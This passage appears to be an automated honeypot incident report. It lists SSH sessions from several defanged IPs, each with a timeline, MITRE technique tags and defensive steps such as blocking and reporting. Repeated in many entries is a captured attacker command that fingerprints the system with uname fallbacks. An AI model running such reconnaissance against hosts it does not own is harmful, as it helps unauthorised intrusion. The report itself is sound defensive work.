| `2026-07-06 13:51:21` | `cowrie.login.success` |
| `2026-07-06 13:51:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.164.155[.]115` to AbuseIPDB if not already reported
- [ ] Block `193.164.155[.]115` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d83fda0d99a8

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 13:51 |
| **Last Seen** | 2026-07-06 13:51 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:51:46` | `cowrie.session.connect` |
| `2026-07-06 13:51:47` | `cowrie.client.version` |
| `2026-07-06 13:51:47` | `cowrie.client.kex` |
| `2026-07-06 13:51:49` | `cowrie.login.success` |
| `2026-07-06 13:51:50` | `cowrie.session.params` |
| `2026-07-06 13:51:50` | `cowrie.command.input` |
| `2026-07-06 13:51:50` | `cowrie.command.input` |
| `2026-07-06 13:51:50` | `cowrie.command.input` |
| `2026-07-06 13:51:50` | `cowrie.command.input` |
| `2026-07-06 13:51:50` | `cowrie.command.input` |
| `2026-07-06 13:51:50` | `cowrie.command.success` |
| `2026-07-06 13:51:50` | `cowrie.command.input` |
| `2026-07-06 13:51:50` | `cowrie.command.input` |
| `2026-07-06 13:51:50` | `cowrie.command.input` |
| `2026-07-06 13:51:50` | `cowrie.command.input` |
| `2026-07-06 13:51:51` | `cowrie.log.closed` |
| `2026-07-06 13:51:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bcbbb5afba24

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 13:51 |
| **Last Seen** | 2026-07-06 13:52 |
| **Session Duration** | 40s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:51:52` | `cowrie.session.connect` |
| `2026-07-06 13:51:56` | `cowrie.client.version` |
| `2026-07-06 13:51:56` | `cowrie.client.kex` |
| `2026-07-06 13:52:15` | `cowrie.login.success` |
| `2026-07-06 13:52:25` | `cowrie.session.params` |
| `2026-07-06 13:52:25` | `cowrie.command.input` |
| `2026-07-06 13:52:25` | `cowrie.command.input` |
| `2026-07-06 13:52:25` | `cowrie.command.input` |
| `2026-07-06 13:52:25` | `cowrie.command.input` |
| `2026-07-06 13:52:25` | `cowrie.command.input` |
| `2026-07-06 13:52:25` | `cowrie.command.success` |
| `2026-07-06 13:52:25` | `cowrie.command.input` |
| `2026-07-06 13:52:25` | `cowrie.command.input` |
| `2026-07-06 13:52:25` | `cowrie.command.input` |
| `2026-07-06 13:52:25` | `cowrie.command.input` |
| `2026-07-06 13:52:29` | `cowrie.log.closed` |
| `2026-07-06 13:52:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e781c29c1ad9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 13:53 |
| **Last Seen** | 2026-07-06 13:53 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:53:08` | `cowrie.session.connect` |
| `2026-07-06 13:53:09` | `cowrie.client.version` |
| `2026-07-06 13:53:09` | `cowrie.client.kex` |
| `2026-07-06 13:53:11` | `cowrie.login.success` |
| `2026-07-06 13:53:12` | `cowrie.session.params` |
| `2026-07-06 13:53:12` | `cowrie.command.input` |
| `2026-07-06 13:53:12` | `cowrie.command.input` |
| `2026-07-06 13:53:12` | `cowrie.command.input` |
| `2026-07-06 13:53:12` | `cowrie.command.input` |
| `2026-07-06 13:53:12` | `cowrie.command.input` |
| `2026-07-06 13:53:12` | `cowrie.command.success` |
| `2026-07-06 13:53:12` | `cowrie.command.input` |
| `2026-07-06 13:53:12` | `cowrie.command.input` |
| `2026-07-06 13:53:12` | `cowrie.command.input` |
| `2026-07-06 13:53:12` | `cowrie.command.input` |
| `2026-07-06 13:53:13` | `cowrie.log.closed` |
| `2026-07-06 13:53:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8148604ea66

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 13:53 |
| **Last Seen** | 2026-07-06 13:54 |
| **Session Duration** | 47s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:53:44` | `cowrie.session.connect` |
| `2026-07-06 13:53:49` | `cowrie.client.version` |
| `2026-07-06 13:53:49` | `cowrie.client.kex` |
| `2026-07-06 13:54:22` | `cowrie.login.success` |
| `2026-07-06 13:54:29` | `cowrie.session.params` |
| `2026-07-06 13:54:29` | `cowrie.command.input` |
| `2026-07-06 13:54:29` | `cowrie.command.input` |
| `2026-07-06 13:54:29` | `cowrie.command.input` |
| `2026-07-06 13:54:29` | `cowrie.command.input` |
| `2026-07-06 13:54:29` | `cowrie.command.input` |
| `2026-07-06 13:54:29` | `cowrie.command.success` |
| `2026-07-06 13:54:29` | `cowrie.command.input` |
| `2026-07-06 13:54:29` | `cowrie.command.input` |
| `2026-07-06 13:54:29` | `cowrie.command.input` |
| `2026-07-06 13:54:29` | `cowrie.command.input` |
| `2026-07-06 13:54:31` | `cowrie.log.closed` |
| `2026-07-06 13:54:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ebe2f77ee7d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 13:54 |
| **Last Seen** | 2026-07-06 13:54 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:54:30` | `cowrie.session.connect` |
| `2026-07-06 13:54:30` | `cowrie.client.version` |
| `2026-07-06 13:54:30` | `cowrie.client.kex` |
| `2026-07-06 13:54:32` | `cowrie.login.success` |
| `2026-07-06 13:54:34` | `cowrie.session.params` |
| `2026-07-06 13:54:34` | `cowrie.command.input` |
| `2026-07-06 13:54:34` | `cowrie.command.input` |
| `2026-07-06 13:54:34` | `cowrie.command.input` |
| `2026-07-06 13:54:34` | `cowrie.command.input` |
| `2026-07-06 13:54:34` | `cowrie.command.input` |
| `2026-07-06 13:54:34` | `cowrie.command.success` |
| `2026-07-06 13:54:34` | `cowrie.command.input` |
| `2026-07-06 13:54:34` | `cowrie.command.input` |
| `2026-07-06 13:54:34` | `cowrie.command.input` |
| `2026-07-06 13:54:34` | `cowrie.command.input` |
| `2026-07-06 13:54:34` | `cowrie.log.closed` |
| `2026-07-06 13:54:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ed81515ddba

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 13:55 |
| **Last Seen** | 2026-07-06 13:56 |
| **Session Duration** | 43s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:55:41` | `cowrie.session.connect` |
| `2026-07-06 13:55:45` | `cowrie.client.version` |
| `2026-07-06 13:55:45` | `cowrie.client.kex` |
| `2026-07-06 13:56:07` | `cowrie.login.success` |
| `2026-07-06 13:56:17` | `cowrie.session.params` |
| `2026-07-06 13:56:17` | `cowrie.command.input` |
| `2026-07-06 13:56:17` | `cowrie.command.input` |
| `2026-07-06 13:56:17` | `cowrie.command.input` |
| `2026-07-06 13:56:17` | `cowrie.command.input` |
| `2026-07-06 13:56:17` | `cowrie.command.input` |
| `2026-07-06 13:56:17` | `cowrie.command.success` |
| `2026-07-06 13:56:17` | `cowrie.command.input` |
| `2026-07-06 13:56:17` | `cowrie.command.input` |
| `2026-07-06 13:56:17` | `cowrie.command.input` |
| `2026-07-06 13:56:17` | `cowrie.command.input` |
| `2026-07-06 13:56:21` | `cowrie.log.closed` |
| `2026-07-06 13:56:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-abd0c20cbed9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 13:55 |
| **Last Seen** | 2026-07-06 13:55 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:55:51` | `cowrie.session.connect` |
| `2026-07-06 13:55:51` | `cowrie.client.version` |
| `2026-07-06 13:55:51` | `cowrie.client.kex` |
| `2026-07-06 13:55:53` | `cowrie.login.success` |
| `2026-07-06 13:55:55` | `cowrie.session.params` |
| `2026-07-06 13:55:55` | `cowrie.command.input` |
| `2026-07-06 13:55:55` | `cowrie.command.input` |
| `2026-07-06 13:55:55` | `cowrie.command.input` |
| `2026-07-06 13:55:55` | `cowrie.command.input` |
| `2026-07-06 13:55:55` | `cowrie.command.input` |
| `2026-07-06 13:55:55` | `cowrie.command.success` |
| `2026-07-06 13:55:55` | `cowrie.command.input` |
| `2026-07-06 13:55:55` | `cowrie.command.input` |
| `2026-07-06 13:55:55` | `cowrie.command.input` |
| `2026-07-06 13:55:55` | `cowrie.command.input` |
| `2026-07-06 13:55:55` | `cowrie.log.closed` |
| `2026-07-06 13:55:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6e976772294

| Field | Detail |
|---|---|
| **Source IP** | `130.211.64[.]11` |
| **First Seen** | 2026-07-06 13:57 |
| **Last Seen** | 2026-07-06 13:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:57:02` | `cowrie.session.connect` |
| `2026-07-06 13:57:02` | `cowrie.login.success` |
| `2026-07-06 13:57:03` | `cowrie.session.params` |
| `2026-07-06 13:57:03` | `cowrie.command.input` |
| `2026-07-06 13:57:03` | `cowrie.command.input` |
| `2026-07-06 13:57:03` | `cowrie.command.failed` |
| `2026-07-06 13:57:03` | `cowrie.command.input` |
| `2026-07-06 13:57:03` | `cowrie.log.closed` |
| `2026-07-06 13:57:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.211.64[.]11` to AbuseIPDB if not already reported
- [ ] Block `130.211.64[.]11` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-090245f4f385

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 13:57 |
| **Last Seen** | 2026-07-06 13:57 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:57:11` | `cowrie.session.connect` |
| `2026-07-06 13:57:12` | `cowrie.client.version` |
| `2026-07-06 13:57:12` | `cowrie.client.kex` |
| `2026-07-06 13:57:14` | `cowrie.login.success` |
| `2026-07-06 13:57:16` | `cowrie.session.params` |
| `2026-07-06 13:57:16` | `cowrie.command.input` |
| `2026-07-06 13:57:16` | `cowrie.command.input` |
| `2026-07-06 13:57:16` | `cowrie.command.input` |
| `2026-07-06 13:57:16` | `cowrie.command.input` |
| `2026-07-06 13:57:16` | `cowrie.command.input` |
| `2026-07-06 13:57:16` | `cowrie.command.success` |
| `2026-07-06 13:57:16` | `cowrie.command.input` |
| `2026-07-06 13:57:16` | `cowrie.command.input` |
| `2026-07-06 13:57:16` | `cowrie.command.input` |
| `2026-07-06 13:57:16` | `cowrie.command.input` |
| `2026-07-06 13:57:17` | `cowrie.log.closed` |
| `2026-07-06 13:57:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5c9058602cc

| Field | Detail |
|---|---|
| **Source IP** | `130.211.64[.]11` |
| **First Seen** | 2026-07-06 13:57 |
| **Last Seen** | 2026-07-06 13:57 |
| **Session Duration** | 38s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:57:16` | `cowrie.session.connect` |
| `2026-07-06 13:57:16` | `cowrie.login.success` |
| `2026-07-06 13:57:17` | `cowrie.session.params` |
| `2026-07-06 13:57:17` | `cowrie.command.input` |
| `2026-07-06 13:57:17` | `cowrie.command.failed` |
| `2026-07-06 13:57:55` | `cowrie.log.closed` |
| `2026-07-06 13:57:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.211.64[.]11` to AbuseIPDB if not already reported
- [ ] Block `130.211.64[.]11` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90bf0337a044

| Field | Detail |
|---|---|
| **Source IP** | `130.211.64[.]11` |
| **First Seen** | 2026-07-06 13:57 |
| **Last Seen** | 2026-07-06 13:57 |
| **Session Duration** | 36s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:57:18` | `cowrie.session.connect` |
| `2026-07-06 13:57:18` | `cowrie.login.success` |
| `2026-07-06 13:57:19` | `cowrie.session.params` |
| `2026-07-06 13:57:19` | `cowrie.command.input` |
| `2026-07-06 13:57:55` | `cowrie.log.closed` |
| `2026-07-06 13:57:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.211.64[.]11` to AbuseIPDB if not already reported
- [ ] Block `130.211.64[.]11` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5555b5be4449

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 13:57 |
| **Last Seen** | 2026-07-06 13:58 |
| **Session Duration** | 44s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:57:34` | `cowrie.session.connect` |
| `2026-07-06 13:57:39` | `cowrie.client.version` |
| `2026-07-06 13:57:39` | `cowrie.client.kex` |
| `2026-07-06 13:57:59` | `cowrie.login.success` |
| `2026-07-06 13:58:10` | `cowrie.session.params` |
| `2026-07-06 13:58:10` | `cowrie.command.input` |
| `2026-07-06 13:58:10` | `cowrie.command.input` |
| `2026-07-06 13:58:10` | `cowrie.command.input` |
| `2026-07-06 13:58:10` | `cowrie.command.input` |
| `2026-07-06 13:58:10` | `cowrie.command.input` |
| `2026-07-06 13:58:10` | `cowrie.command.success` |
| `2026-07-06 13:58:10` | `cowrie.command.input` |
| `2026-07-06 13:58:10` | `cowrie.command.input` |
| `2026-07-06 13:58:10` | `cowrie.command.input` |
| `2026-07-06 13:58:10` | `cowrie.command.input` |
| `2026-07-06 13:58:15` | `cowrie.log.closed` |
| `2026-07-06 13:58:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6efdf322103c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 13:58 |
| **Last Seen** | 2026-07-06 13:58 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:58:32` | `cowrie.session.connect` |
| `2026-07-06 13:58:32` | `cowrie.client.version` |
| `2026-07-06 13:58:32` | `cowrie.client.kex` |
| `2026-07-06 13:58:34` | `cowrie.login.success` |
| `2026-07-06 13:58:36` | `cowrie.session.params` |
| `2026-07-06 13:58:36` | `cowrie.command.input` |
| `2026-07-06 13:58:36` | `cowrie.command.input` |
| `2026-07-06 13:58:36` | `cowrie.command.input` |
| `2026-07-06 13:58:36` | `cowrie.command.input` |
| `2026-07-06 13:58:36` | `cowrie.command.input` |
| `2026-07-06 13:58:36` | `cowrie.command.success` |
| `2026-07-06 13:58:36` | `cowrie.command.input` |
| `2026-07-06 13:58:36` | `cowrie.command.input` |
| `2026-07-06 13:58:36` | `cowrie.command.input` |
| `2026-07-06 13:58:36` | `cowrie.command.input` |
| `2026-07-06 13:58:37` | `cowrie.log.closed` |
| `2026-07-06 13:58:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-22be70ee74d5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 13:59 |
| **Last Seen** | 2026-07-06 14:00 |
| **Session Duration** | 42s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:59:30` | `cowrie.session.connect` |
| `2026-07-06 13:59:35` | `cowrie.client.version` |
| `2026-07-06 13:59:35` | `cowrie.client.kex` |
